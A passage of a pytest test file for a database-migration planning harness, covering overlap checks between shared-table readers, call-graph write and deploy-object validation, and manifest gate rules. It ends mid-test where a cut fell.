def test_reader_slices_are_the_union_of_every_object_and_embed_reading_the_table():
    """Every read of the table is a slice the other readers must be apart from: each object's and, since the
    harness scopes an embed's nested reads by the embed's own predicate, each embed's (on its own
    scope_columns or the object's)."""
    fn = _functions()
    two = {"objects": [{**UNBOUNDED["objects"][0], "target_where": "region = 'eu'"},
                       {**UNBOUNDED["objects"][0], "object": "MIG.T", "target_where": "region = 'us'",
                        "embeds": [{"array_path": "items", "target_where": "run_id = 7"},
                                   {"array_path": "lines", "scope_columns": ["line_no"], "target_where": "line_no = 1"}]},
                       {"object": "mig.other", "target_where": "region = 'apac'"}]}
    assert fn["reader_slices"](two, "mig.t") == (_slices("region = 'eu' OR region = 'us' OR run_id = 7")
                                                 + fn["predicate_slices"]("line_no = 1", ["line_no"]))
    other = fn["predicate_slices"]("region = 'apac' AND run_id = 8 AND line_no = 2", SCOPE + ["line_no"])
    assert fn["disjoint_slices"](fn["reader_slices"](two, "mig.t"), other)
    assert not fn["disjoint_slices"](fn["reader_slices"](two, "mig.t"), _slices("region = 'apac' AND run_id = 7"))
    assert fn["reader_slices"](two, "mig.none") is None


@pytest.mark.parametrize("a, b, apart", [
    ("run_date = '${as_of}'", "run_date = '${as_of}'", False),
    ("run_date = '2024-01-01'", "run_date = '2024-01-01'", False),
    ("unit_id = 'u1'", "unit_id = 'u2'", True),
])
def test_shared_table_embeds_must_be_apart_even_when_their_objects_are(a, b, apart):
    """Disjoint object predicates prove nothing about the embeds' reads: two units whose embeds recon the same
    rows of the shared table halt as an overlap; embeds apart on their own pass."""
    check = _functions()["check_write_targets"]
    u1 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": "unit_id = 'u1'",
                       "embeds": [{"array_path": "items", "target_where": a}]}]}
    u2 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": "unit_id = 'u2'",
                       "embeds": [{"array_path": "items", "target_where": b}]}]}
    if apart:
        check([B1], OTHERS, _specs(u1=u1, u2=u2))
    else:
        with pytest.raises(SystemExit, match=r"'mig.t'.*u1 .*u2 .*overlap"):
            check([B1], OTHERS, _specs(u1=u1, u2=u2))


@pytest.mark.parametrize("scope", [None, [], "run_date", [1], [""]])
def test_shared_table_reader_must_declare_scope_columns(scope):
    check = _functions()["check_write_targets"]
    row = {k: v for k, v in BOUNDED["objects"][0].items() if k != "scope_columns"}
    spec = {"objects": [row if scope is None else {**row, "scope_columns": scope}]}
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*scope_columns"):
        check([B1], OTHERS, _specs(u1=spec, u2=PRIOR))


def _embedded(embed):
    return {"objects": [{**BOUNDED["objects"][0], "embeds": [{"array_path": "items", "child_table": "dbo.i", **embed}]}]}


@pytest.mark.parametrize("embed", [{}, {"target_where": ""}, {"target_where": "1 = 1"}, {"target_where": "other = 1"},
                                   {"target_where": "run_date IS NOT NULL"},
                                   {"scope_columns": ["item_run"], "target_where": "run_date = '${as_of}'"},
                                   {"scope_columns": [], "target_where": "run_date = '${as_of}'"}])
def test_embed_of_a_shared_table_reader_needs_its_own_bound(embed):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*embed 'items'.*target_where"):
        check([B1], OTHERS, _specs(u1=_embedded(embed), u2=PRIOR))


@pytest.mark.parametrize("embed", [{"target_where": "run_date = '${as_of}'"},
                                   {"scope_columns": ["item_run", "run_date"],
                                    "target_where": "item_run = 1 AND run_date = '${as_of}'"}])
def test_embed_bounded_on_its_own_or_the_objects_scope_columns_passes(embed):
    check = _functions()["check_write_targets"]
    check([B1], OTHERS, _specs(u1=_embedded(embed), u2=PRIOR))


def test_embed_rows_must_be_a_list_of_objects():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"u1.*embeds"):
        check([B1], OTHERS, _specs(u1={"objects": [{**BOUNDED["objects"][0], "embeds": "items"}]}, u2=PRIOR))


def test_other_wave_manifests_reads_every_wave_but_the_current_and_fails_closed(tmp_path):
    read = _functions()["other_wave_manifests"]
    (tmp_path / "wave-0.json").write_text(json.dumps({"batches": [B1]}))
    (tmp_path / "wave-1.json").write_text(json.dumps({"target_namespace": "cat.mig", "batches": [B2]}))
    (tmp_path / "wave-1.result.json").write_text("{")
    (tmp_path / "wave-1.doctor.json").write_text("{")
    (tmp_path / "wave-2.brief.md").write_text("x")
    assert read(tmp_path, "wave-0.json") == {"wave-1.json": {"target_namespace": "cat.mig", "batches": [B2]}}
    assert read(tmp_path, "wave-1.json") == {"wave-0.json": {"target_namespace": "", "batches": [B1]}}
    (tmp_path / "wave-1.json").write_text(json.dumps({"target_namespace": "cat.", "batches": [B2]}))
    with pytest.raises(SystemExit, match=r"wave-1\.json.*target_namespace"):
        read(tmp_path, "wave-0.json")
    (tmp_path / "wave-1.json").write_text(json.dumps({"batches": [B2]}))
    (tmp_path / "wave-2.json").write_text("{")
    with pytest.raises(SystemExit, match=r"wave-2\.json.*JSON"):
        read(tmp_path, "wave-0.json")


@pytest.mark.parametrize("manifest", [[], {}, {"batches": {}}, {"batches": ["b"]}, {"batches": [{"id": "b"}]},
                                      {"batches": [{"id": "b", "units": ["u"], "write_targets": "t"}]},
                                      {"batches": [{"id": "b", "units": "u", "write_targets": ["t"]}]}])
def test_other_wave_manifest_without_batch_rows_halts(tmp_path, manifest):
    read = _functions()["other_wave_manifests"]
    (tmp_path / "wave-3.json").write_text(json.dumps(manifest))
    with pytest.raises(SystemExit, match=r"wave-3\.json.*batches"):
        read(tmp_path, "wave-0.json")


def test_unit_mapping_is_none_when_absent_and_halts_when_malformed(tmp_path):
    ns = _functions()
    ns["ROOT"] = tmp_path
    assert ns["unit_mapping"]("u9") is None
    spec = tmp_path / ".migration" / "units" / "u9" / "mapping_spec.json"
    spec.parent.mkdir(parents=True)
    spec.write_text(json.dumps(BOUNDED))
    assert ns["unit_mapping"]("u9") == BOUNDED
    spec.write_text("{")
    with pytest.raises(SystemExit, match=r"u9/mapping_spec\.json.*JSON"):
        ns["unit_mapping"]("u9")


# ---------------------------------------------------------------- route by call graph (WS3.4)

FIXTURE = Path(__file__).resolve().parents[1] / "oracle-plsql" / "fixtures" / "example_dependencies.json"


def _routine(name, reads=(), writes=(), calls=()):
    return {"routine": name, "reads": list(reads), "writes": list(writes), "calls": list(calls)}


CLOSE = _routine("app.close_period", reads=["src.ledger"], writes=["mig.ledger"], calls=["app.log_run"])
LOG = _routine("app.log_run", writes=["mig.run_log"])
LOOP = _routine("app.retry", calls=["app.close_period"])
TARGETS = ["mig.ledger", "mig.run_log", "mig.close_period"]
DEPLOYS = {"deploy_objects": ["mig.close_period"]}


def _deps(**by_unit):
    return lambda unit: by_unit.get(unit)


def test_transitive_writes_follows_calls_and_tolerates_cycles():
    writes = _functions()["transitive_writes"]
    assert writes([CLOSE, LOG, LOOP]) == {"mig.ledger", "mig.run_log"}
    assert writes([LOG]) == {"mig.run_log"}
    assert writes([_routine("app.read_only", reads=["src.x"])]) == set()


def test_transitive_writes_is_case_insensitive_on_routine_and_table_names():
    writes = _functions()["transitive_writes"]
    assert writes([_routine("APP.A", writes=["MIG.T"], calls=["app.b"]), _routine("app.B", writes=["mig.t"])]) == {"mig.t"}


def test_transitive_writes_halts_on_a_callee_the_analysis_does_not_cover():
    writes = _functions()["transitive_writes"]
    with pytest.raises(SystemExit, match=r"app\.close_period.*app\.log_run"):
        writes([CLOSE])


def test_check_dependencies_passes_when_declared_targets_equal_transitive_writes():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["MIG.ledger", "mig.run_log", "mig.close_period"], **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    retry = {**b, "units": ["u", "v"], "write_targets": b["write_targets"] + ["mig.retry"],
             "deploy_objects": ["mig.close_period", "mig.retry"]}
    check([retry], _deps(u=[CLOSE, LOG], v=[LOOP]), namespace="mig")
    check([{**b, "units": ["u", "v"]}], _deps(u=[CLOSE, LOG]), namespace="mig")


def test_every_root_of_the_call_graph_is_a_declared_deploy_object():
    """The analysis lists the routines a unit converts; the ones nothing else in the batch calls are its
    entry points and ship as deployed objects (procedures, jobs, views), which collide like any table.
    An entry point absent from deploy_objects (its bare name under target_namespace, case-folded) is a mismatch;
    a callee may be inlined into its caller and needs no row."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-8", "units": ["u"], "write_targets": TARGETS, **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    check([{**b, "deploy_objects": ["MIG.Close_Period"]}], _deps(u=[CLOSE, LOG]), namespace="mig")
    check([{**b, "write_targets": TARGETS + ["mig.log_run"], "deploy_objects": ["mig.close_period", "mig.log_run"]}],
          _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.close_period.*deploy_objects"):
        check([{**b, "write_targets": ["mig.ledger", "mig.run_log", "mig.other"], "deploy_objects": ["mig.other"]}],
              _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.retry.*deploy_objects"):
        check([{**b, "units": ["u", "v"]}], _deps(u=[CLOSE, LOG], v=[LOOP]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.close_period.*deploy_objects"):
        check([{**b, "write_targets": ["mig.ledger", "mig.run_log"], "deploy_objects": []}], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.read_only.*deploy_objects"):
        check([{**b, "write_targets": [], "deploy_objects": []}], _deps(u=[READ_ONLY]), namespace="mig")


def test_same_named_roots_in_different_schemas_each_need_a_deploy_object_of_their_own():
    """Two entry points whose trailing names agree (`app.close` and `legacy.close`) are two deployed objects:
    one deploy_objects row cannot stand for both, a row qualified like one of them is that one's, a row
    qualified like neither (`mig.other.close`) is nobody's, and a bare `mig.close` stands in only for a root
    whose trailing name no other root shares."""
    check = _functions()["check_dependencies"]
    roots = [_routine("app.close", writes=["mig.a"]), _routine("legacy.close", writes=["mig.b"])]
    b = {"id": "b-9", "units": ["u"], "write_targets": ["mig.a", "mig.b", "mig.close"], "deploy_objects": ["mig.close"], "brief": "b"}
    with pytest.raises(SystemExit, match=r"b-9.*close.*deploy_objects"):
        check([b], _deps(u=roots), namespace="mig")
    check([{**b, "write_targets": ["mig.a", "mig.b", "mig.app.close", "mig.legacy.close"],
            "deploy_objects": ["mig.app.close", "mig.legacy.close"]}], _deps(u=roots), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*legacy\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.b", "mig.app.close", "mig.close"],
                "deploy_objects": ["mig.app.close", "mig.close"]}], _deps(u=roots), namespace="mig")
    check([{**b, "write_targets": ["mig.a", "mig.close"], "deploy_objects": ["mig.close"]}], _deps(u=[roots[0]]),
          namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*legacy\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.b", "mig.app.close", "mig.other.close"],
                "deploy_objects": ["mig.app.close", "mig.other.close"]}], _deps(u=roots), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.other.close"], "deploy_objects": ["mig.other.close"]}],
              _deps(u=[roots[0]]), namespace="mig")


@pytest.mark.parametrize("row", ["prod.app.close", "cat.other.app.close", "prod.close", "other.mig.app.close"])
def test_a_deploy_object_outside_target_namespace_never_stands_for_a_root(row):
    """A deploy_objects row is the root's only under target_namespace: `cat.mig.app.close` or the bare
    `cat.mig.close` for `app.close`, never an object of some other catalog or schema that happens to end in
    the same name (that is a production object the plan must not launch against)."""
    check = _functions()["check_dependencies"]
    root = _routine("app.close", writes=["cat.mig.a"])
    b = {"id": "b-9", "units": ["u"], "write_targets": ["cat.mig.a", row], "deploy_objects": [row], "brief": "b"}
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*deploy_objects"):
        check([b], _deps(u=[root]), namespace="cat.mig")
    for good in ("cat.mig.app.close", "cat.mig.close", "close"):
        check([{**b, "write_targets": ["cat.mig.a", good], "deploy_objects": [good]}], _deps(u=[root]),
              namespace="cat.mig")


def test_a_bare_root_takes_the_one_row_of_its_name_and_halts_when_several_could_be_it():
    """A root the analysis names without a schema (`close`) is the deploy_objects row under target_namespace
    whose trailing name is `close`: exactly one (`mig.close` or `mig.app.close`) is its row; two candidates
    (`mig.app.close` and `mig.legacy.close`) make the root ambiguous, which halts like an undeclared one rather
    than guessing; a qualified root (`app.close`) still takes only its exact spelling or the bare row."""
    check = _functions()["check_dependencies"]
    root = _routine("close", writes=["mig.a"])
    b = {"id": "b-9", "units": ["u"], "write_targets": ["mig.a", "mig.close"], "deploy_objects": ["mig.close"], "brief": "b"}
    check([b], _deps(u=[root]), namespace="mig")
    check([{**b, "write_targets": ["mig.a", "mig.app.close"], "deploy_objects": ["mig.app.close"]}], _deps(u=[root]),
          namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*close.*ambiguous.*mig\.app\.close.*mig\.legacy\.close"):
        check([{**b, "write_targets": ["mig.a", "mig.app.close", "mig.legacy.close"],
                "deploy_objects": ["mig.app.close", "mig.legacy.close"]}], _deps(u=[root]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.legacy.close"], "deploy_objects": ["mig.legacy.close"]}],
              _deps(u=[_routine("app.close", writes=["mig.a"])]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*ambiguous.*x\.app\.close.*y\.app\.close"):
        check([{**b, "write_targets": ["a", "x.app.close", "y.app.close"], "deploy_objects": ["x.app.close", "y.app.close"]}],
              _deps(u=[_routine("app.close", writes=["a"])]))


def test_a_complete_analysis_with_no_routines_is_a_graph_that_writes_and_deploys_nothing():
    """Every unit analysed and none converting a routine is a real (empty) graph: a declared table is then
    an extra nothing writes, the same mismatch as with routines. A deploy object is not: the analysis has
    rows for routines only, and a view or job the unit deploys is a deploy_objects row with no routine."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-0", "units": ["u", "v"], "write_targets": [], "brief": "b"}
    check([b], _deps(u=[], v=[]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-0.*extra.*mig\.t"):
        check([{**b, "write_targets": ["mig.t"]}], _deps(u=[], v=[]), namespace="mig")
    check([{**b, "write_targets": ["mig.customer_v"], "deploy_objects": ["mig.customer_v"]}], _deps(u=[], v=[]),
          namespace="mig")


def test_check_dependencies_skips_a_batch_with_no_analysis_at_all():
    check = _functions()["check_dependencies"]
    check([{"id": "b", "units": ["u"], "write_targets": ["mig.t"], "brief": "b"}], _deps(), namespace="mig")


def test_check_dependencies_names_missing_and_extra_tables():
    check = _functions()["check_dependencies"]
    b = {"id": "b-7", "units": ["u"], "write_targets": ["mig.ledger", "mig.stale", "mig.close_period"], **DEPLOYS, "brief": "b"}
    with pytest.raises(SystemExit) as e:
        check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    msg = str(e.value)
    assert "b-7" in msg
    assert re.search(r"missing.*mig\.run_log", msg)
    assert re.search(r"extra.*mig\.stale", msg)
    assert "mig.ledger" not in msg.split("missing", 1)[1].split("extra", 1)[0]


def test_check_dependencies_halts_when_the_analysis_writes_nothing_the_batch_declared():
    check = _functions()["check_dependencies"]
    with pytest.raises(SystemExit, match=r"b.*extra.*mig\.t"):
        check([{"id": "b", "units": ["u"], "write_targets": ["mig.t"], "brief": "b"}],
              _deps(u=[_routine("app.read_only", reads=["src.x"])]), namespace="mig")


READ_ONLY = _routine("app.read_only", reads=["src.x"])


def test_read_only_batch_may_declare_no_targets_only_when_every_unit_is_analysed_and_writes_nothing():
    """A read-only routine still ships as a deployed object (a view, say), so the only batch with no write
    targets at all is one whose every unit is analysed and converts no routine."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-3", "units": ["u"], "write_targets": [], "brief": "b"}
    check([b], _deps(u=[]), namespace="mig")
    check([{**b, "units": ["u", "v"]}], _deps(u=[], v=[]), namespace="mig")
    view = {**b, "write_targets": ["mig.read_only"], "deploy_objects": ["mig.read_only"]}
    check([view], _deps(u=[READ_ONLY]), namespace="mig")
    check([{**view, "units": ["u", "v"], "write_targets": ["mig.read_only", "mig.v"], "deploy_objects": ["mig.read_only", "mig.v"]}],
          _deps(u=[READ_ONLY], v=[_routine("app.v", reads=["src.y"])]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-3.*write_targets.*analysis"):
        check([b], _deps(), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-3.*write_targets.*analysis"):
        check([{**b, "units": ["u", "v"]}], _deps(u=[]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-3.*missing.*mig\.run_log"):
        check([b], _deps(u=[LOG]), namespace="mig")


def test_check_dependencies_with_an_unanalysed_unit_checks_only_missing_tables():
    check = _functions()["check_dependencies"]
    b = {"id": "b-4", "units": ["u", "v"], "write_targets": TARGETS + ["mig.v_only"], **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-4.*missing.*mig\.run_log") as e:
        check([{**b, "write_targets": ["mig.ledger", "mig.close_period", "mig.v_only"]}], _deps(u=[CLOSE, LOG]), namespace="mig")
    assert "mig.v_only" not in str(e.value)
    with pytest.raises(SystemExit, match=r"b-4.*extra.*mig\.v_only"):
        check([{**b, "deploy_objects": ["mig.close_period", "mig.read_only"], "write_targets": b["write_targets"] + ["mig.read_only"]}],
              _deps(u=[CLOSE, LOG], v=[READ_ONLY]), namespace="mig")


def test_check_dependencies_compares_targets_as_one_case_insensitive_identity():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["`MIG`.`Ledger`", " mig.RUN_LOG ", "mig.close_period"], **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    assert _functions()["transitive_writes"]([_routine("a", writes=['"MIG"."T"', "mig.t"])]) == {"mig.t"}


def _spec(*pairs):
    return {"objects": [{"object": tgt, "root_table": src, "key": ["id"]} for src, tgt in pairs]}


def _maps(**by_unit):
    return lambda unit: by_unit.get(unit)


SRC_CLOSE = _routine("app.close_period", reads=["app.period"], writes=["APP.LEDGER"], calls=["app.log_run"])
SRC_LOG = _routine("app.log_run", writes=["app.run_log"])


def test_check_dependencies_resolves_source_writes_through_the_units_mapping_spec():
    """The analysis names the legacy tables a routine writes; the manifest names what the child deploys.
    A written source table is the target its mapping object (root_table -> object) gives it, and the
    manifest's bare names are the manifest's target_namespace, so a renamed target compares as itself."""
    check = _functions()["check_dependencies"]
    spec = _spec(("app.ledger", "finance.ledger"), ("APP.RUN_LOG", "run_log"))
    b = {"id": "b", "units": ["u"], "write_targets": ["mig.finance.ledger", "MIG.app.run_log", "close_period"],
         "deploy_objects": ["close_period"], "brief": "b"}
    check([b], _deps(u=[SRC_CLOSE, SRC_LOG]), _maps(u=spec), "mig.app")
    with pytest.raises(SystemExit, match=r"b.*missing.*mig\.finance\.ledger.*extra.*mig\.app\.ledger"):
        check([{**b, "write_targets": ["app.ledger", "run_log", "close_period"]}], _deps(u=[SRC_CLOSE, SRC_LOG]),
              _maps(u=spec), "mig.app")


def test_check_dependencies_resolves_a_callees_writes_through_the_callees_own_unit():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u", "v"], "write_targets": ["mig.app.ledger", "mig.audit.run_log", "close_period"],
         "deploy_objects": ["close_period"], "brief": "b"}
    check([b], _deps(u=[SRC_CLOSE], v=[SRC_LOG]),
          _maps(u=_spec(("app.ledger", "ledger")), v=_spec(("app.run_log", "audit.run_log"))), "mig.app")
    with pytest.raises(SystemExit, match=r"missing.*mig\.app\.run_log"):
        check([b], _deps(u=[SRC_CLOSE], v=[SRC_LOG]),
              _maps(u=_spec(("app.ledger", "ledger")), v=_spec(("app.run_log", "run_log"))), "mig.app")


def test_check_dependencies_halts_when_a_mapped_unit_writes_a_source_table_its_mapping_does_not_name():
    check = _functions()["check_dependencies"]
    b = {"id": "b-2", "units": ["u"], "write_targets": TARGETS, **DEPLOYS, "brief": "b"}
    with pytest.raises(SystemExit, match=r"b-2.*u.*app\.run_log.*mapping_spec"):
        check([b], _deps(u=[SRC_CLOSE, SRC_LOG]), _maps(u=_spec(("app.ledger", "ledger"))), "mig")


def test_mapped_target_reads_the_legacy_tables_mapping_like_the_harness():
    """The harness accepts both `objects` (object/root_table) and the older `tables`
    (target_table/source_table) mapping shape; the call-graph check resolves through either."""
    mapped = _functions()["mapped_target"]
    legacy = {"tables": [{"source_table": "public.orders", "target_table": "orders", "key": ["id"]}]}
    assert mapped(legacy, "PUBLIC.ORDERS", "cat.mig") == {"cat.mig.orders"}
    assert mapped(legacy, "public.other", "cat.mig") == set()
    assert mapped({"objects": [], "tables": legacy["tables"]}, "public.orders", "mig") == {"mig.orders"}
    assert mapped({"tables": "nope"}, "public.orders") == set()
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["cat.mig.orders", "p"], "deploy_objects": ["p"], "brief": "b"}
    check([b], _deps(u=[{"routine": "p", "reads": [], "writes": ["public.orders"], "calls": []}]),
          _maps(u=legacy), "cat.mig")


def test_a_source_table_split_over_several_mapping_objects_writes_every_one_of_them():
    """One legacy table can feed several target objects (a table and its search copy, say); a write to
    it is a write to all of them, whichever the mapping lists first, so each must be declared."""
    mapped = _functions()["mapped_target"]
    spec = _spec(("src.customer", "customer"), ("src.other", "other"), ("SRC.CUSTOMER", "customer_search"))
    assert mapped(spec, "src.customer", "mig") == {"mig.customer", "mig.customer_search"}
    check = _functions()["check_dependencies"]
    deps = _deps(u=[_routine("app.upsert", writes=["src.customer"])])
    b = {"id": "b", "units": ["u"], "write_targets": ["mig.customer", "mig.customer_search", "upsert"],
         "deploy_objects": ["upsert"], "brief": "b"}
    check([b], deps, _maps(u=spec), "mig")
    with pytest.raises(SystemExit, match=r"b.*missing.*mig\.customer_search"):
        check([{**b, "write_targets": ["mig.customer", "upsert"]}], deps, _maps(u=spec), "mig")


def test_check_dependencies_without_a_mapping_spec_keeps_the_source_name():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["app.ledger", "app.run_log", "close_period"],
         "deploy_objects": ["close_period"], "brief": "b"}
    check([b], _deps(u=[SRC_CLOSE, SRC_LOG]), _maps(), "mig")


def test_deploy_objects_are_declared_targets_outside_the_table_comparison():
    """A procedure, view or job the unit deploys is a write target (it collides like any other) but no
    routine's DML writes it; the batch lists it in deploy_objects so the graph comparison leaves it alone.
    A deploy object that is also a written table halts (one outside write_targets fails the manifest check)."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-5", "units": ["u"], "write_targets": ["mig.ledger", "mig.run_log", "MIG.close_period"],
         "deploy_objects": ["mig.close_period"], "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-5.*extra.*mig\.close_period"):
        check([{**b, "deploy_objects": []}], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-5.*deploy_objects.*mig\.ledger.*writes"):
        check([{**b, "deploy_objects": ["mig.close_period", "mig.ledger"]}], _deps(u=[CLOSE, LOG]), namespace="mig")


@pytest.mark.parametrize("value", ["x", [1], [""], ["mig.p", "MIG.P"]])
def test_manifest_deploy_objects_must_be_a_list_of_distinct_names_in_write_targets(value):
    m = _manifest()
    m["batches"][0]["deploy_objects"] = value
    m["batches"][0]["write_targets"] = m["batches"][0]["write_targets"] + ["mig.p"]
    with pytest.raises(SystemExit, match=r"deploy_objects"):
        _functions()["validate_manifest"](m)


def test_manifest_deploy_objects_outside_write_targets_halt():
    m = _manifest()
    m["batches"][0]["deploy_objects"] = ["mig.p"]
    with pytest.raises(SystemExit, match=r"deploy_objects.*mig\.p.*write_targets"):
        _functions()["validate_manifest"](m)
    m["batches"][0]["write_targets"] = m["batches"][0]["write_targets"] + ["MIG.P"]
    _functions()["validate_manifest"](m)


def test_check_dependencies_halts_on_an_uncovered_callee_naming_the_unit():
    check = _functions()["check_dependencies"]
    with pytest.raises(SystemExit, match=r"u.*app\.close_period.*app\.log_run"):
        check([{"id": "b", "units": ["u"], "write_targets": ["mig.ledger"], "brief": "b"}], _deps(u=[CLOSE]))


@pytest.mark.parametrize("body", ["{", "[]", "{}", '{"routines": {}}', '{"routines": ["x"]}',
                                  '{"routines": [{"reads": []}]}',
                                  '{"routines": [{"routine": "a", "reads": "t", "writes": [], "calls": []}]}',
                                  '{"routines": [{"routine": "a", "reads": [], "writes": [1], "calls": []}]}',
                                  '{"routines": [{"routine": "a", "reads": [], "writes": []}]}',
                                  '{"routines": [{"routine": "a", "reads": [], "writes": [], "calls": []}, '
                                  '{"routine": "A", "reads": [], "writes": [], "calls": []}]}'])
def test_unit_dependencies_halts_on_a_malformed_analysis(tmp_path, body):
    ns = _functions()
    ns["ROOT"] = tmp_path
    p = tmp_path / ".migration" / "units" / "u9" / "dependencies.json"
    p.parent.mkdir(parents=True)
    p.write_text(body)
    with pytest.raises(SystemExit, match=r"u9/dependencies\.json"):
        ns["unit_dependencies"]("u9")


def test_unit_dependencies_is_none_when_absent_and_returns_the_routine_rows(tmp_path):
    ns = _functions()
    ns["ROOT"] = tmp_path
    assert ns["unit_dependencies"]("u9") is None
    p = tmp_path / ".migration" / "units" / "u9" / "dependencies.json"
    p.parent.mkdir(parents=True)
    p.write_text(json.dumps({"routines": [CLOSE, LOG]}))
    assert ns["unit_dependencies"]("u9") == [CLOSE, LOG]
    p.write_text(json.dumps({"routines": []}))
    assert ns["unit_dependencies"]("u9") == []


def test_example_fixture_is_a_valid_analysis_whose_writes_the_check_accepts(tmp_path):
    ns = _functions()
    ns["ROOT"] = tmp_path
    p = tmp_path / ".migration" / "units" / "example" / "dependencies.json"
    p.parent.mkdir(parents=True)
    p.write_text(FIXTURE.read_text())
    routines = ns["unit_dependencies"]("example")
    assert routines and all(set(r) == {"routine", "reads", "writes", "calls"} for r in routines)
    assert any(r["calls"] for r in routines) and any(r["reads"] for r in routines)
    writes = ns["transitive_writes"](routines)
    assert len(writes) > 1 and writes > set().union(*(map(str.casefold, r["writes"]) for r in routines[:1]))
    called = {c.casefold() for r in routines for c in r["calls"]}
    roots = [r["routine"].rsplit(".", 1)[-1] for r in routines if r["routine"].casefold() not in called]
    assert roots and len(roots) < len(routines)
    b = {"id": "b", "units": ["example"], "write_targets": sorted(writes) + roots, "deploy_objects": roots, "brief": "b"}
    ns["check_dependencies"]([b])
    with pytest.raises(SystemExit, match="missing"):
        ns["check_dependencies"]([{**b, "write_targets": sorted(writes)[1:] + roots}])
    with pytest.raises(SystemExit, match="deploy_objects"):
        ns["check_dependencies"]([{**b, "write_targets": sorted(writes), "deploy_objects": []}])


# ---------------------------------------------------------------- gates as manifest rows (WS3.3)

@pytest.mark.parametrize("gates, message", [
    (None, "gates"),
    ([], "gates"),
    ("g-rows", "gates"),
    (["g-rows"], "gates"),
    ([{**GATE, "id": ""}], "id"),
    ([{**GATE, "id": "a b"}], "id"),
    ([dict(GATE), dict(GATE)], "unique"),
    ([{k: v for k, v in GATE.items() if k != "kind"}], "kind"),
    ([{**GATE, "kind": "vibes"}], "kind"),
    ([{k: v for k, v in GATE.items() if k != "status"}], "status"),
    ([{**GATE, "status": "done"}], "status"),
    ([{k: v for k, v in GATE.items() if k != "evidence"}], "evidence"),
    ([{**GATE, "evidence": None}], "evidence"),
    ([{**GATE, "status": "passed", "evidence": ""}], "evidence"),
    ([{**GATE, "status": "waived"}], "decision_id"),
    ([{**GATE, "status": "waived", "decision_id": "7"}], "decision_id"),
    ([{**GATE, "decision_id": "seven"}], "decision_id"),
])
def test_validate_manifest_rejects_missing_or_malformed_gates(gates, message):
    validate_manifest = _functions()["validate_manifest"]
    batch = {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief"}
    if gates is not None:
        batch["gates"] = gates
    m = _manifest()
    m["batches"] = [batch]
    with pytest.raises(SystemExit, match=message):
        validate_manifest(m)


def test_validate_manifest_accepts_every_gate_kind_and_status():
    validate_manifest = _functions()["validate_manifest"]
    kinds = ("byte_compare", "export_file", "publish_leg", "row_parity", "structural", "custom")
    gates = [{"id": f"g-{k}", "kind": k, "status": "pending", "evidence": ""} for k in kinds]
    gates += [{"id": "g-p", "kind": "custom", "status": "passed", "evidence": "recon/u/result.json"},
              {"id": "g-f", "kind": "custom", "status": "failed", "evidence": ""},
              {"id": "g-w", "kind": "custom", "status": "waived", "evidence": "", "decision_id": "D-12"}]
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "x", "gates": gates}]))


def test_gates_sha_is_approved_only_by_the_named_human_stop_c_row_for_this_wave():
    """The approval is one parsed table row: the manifest names its D-<n>; that row has a cell that is the
    decision id, a cell that is a human's provenance, and a cell reading exactly `STOP C wave-<N> gates_sha <sha>`
    for this wave. Tokens scattered through prose, another wave's row, or another D-<n> do not approve."""
    gates_approved = _functions()["gates_approved"]
    sha = "a" * 64
    row = f"| D-3 | 2024-05-01 | user:evt-9 | STOP C wave-2 gates_sha {sha} | plan v3 approved |\n"
    assert gates_approved("D-3", 2, sha, "| D-1 | user:evt-1 | STOP A |\n" + row)
    assert gates_approved("D-3", 2, sha, f"|D-3|user:evt-9|  stop c   wave-2   GATES_SHA {sha}  |\n")
    assert gates_approved("D-3", 2, sha, f"| D-3 | user:evt-9 | STOP C wave-2 gates_sha {sha} |\n".rstrip("|\n") + "\n")
    for ledger in ("",
